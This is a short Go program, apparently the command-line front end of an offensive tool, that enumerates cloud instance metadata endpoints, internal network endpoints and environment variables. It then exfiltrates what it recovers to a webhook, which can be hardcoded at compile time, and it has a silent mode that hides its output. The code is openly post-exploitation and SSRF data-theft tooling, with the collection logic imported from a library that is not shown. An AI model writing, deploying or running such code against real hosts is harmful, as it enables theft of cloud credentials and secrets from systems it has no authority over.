package main

import (
	"flag"
	"io/ioutil"
	"log"
	"os"

	"github.com/ex0dus-0x/sneak"
)

var (
	// Disables specific SSRF checks
	noCloud = flag.Bool("no-cloud", false, "Disables enumerating for cloud metadata endpoints")
	noNet   = flag.Bool("no-net", false, "Disables enumerating environment for internal network endpoints")
	noEnv   = flag.Bool("no-env", false, "Disables enumerating envvars for internal endpoints")

	cloudMeta = flag.String("cloud", "", "Sets a specific cloud provider to do SSRF checks for")
	webhook   = flag.String("webhook", "", "Webhook endpoint to push recovered data to")
	silent    = flag.Bool("silent", false, "Do not output results to stdout")
	logging   = flag.Bool("logging", false, "Print debug logging messages")
	help      = flag.Bool("help", false, "Display this help screen")
)

// We can also set this through the linker in the case we're in an environment
// where passing in flags or envvars isn't possible
var CompileTimeWebhook string

// TODO: better logging
func main() {
	flag.Parse()
	if *help {
		flag.Usage()
		os.Exit(0)
	}

	if !*logging {
		log.SetOutput(ioutil.Discard)
	}

	enum := sneak.StartEnum()
	if !*noCloud {
		log.Println("Enumerating instance metadata endpoints")
		if err := enum.CheckCloud(cloudMeta); err != nil {
			log.Fatal(err)
		}
	}
	if !*noNet {
		log.Println("Enumerating net")
		enum.CheckNet()
	}
	if !*noEnv {
		log.Println("Dropping environment variables")
		enum.CheckEnv()
	}

	// override's the flag if set
	if CompileTimeWebhook != "" {
		webhook = &CompileTimeWebhook
		log.Printf("Using webhook %s for exfiltration\n", *webhook)
	}

	if err := enum.Export(webhook, *silent); err != nil {
		log.Fatal(err)
	}
}
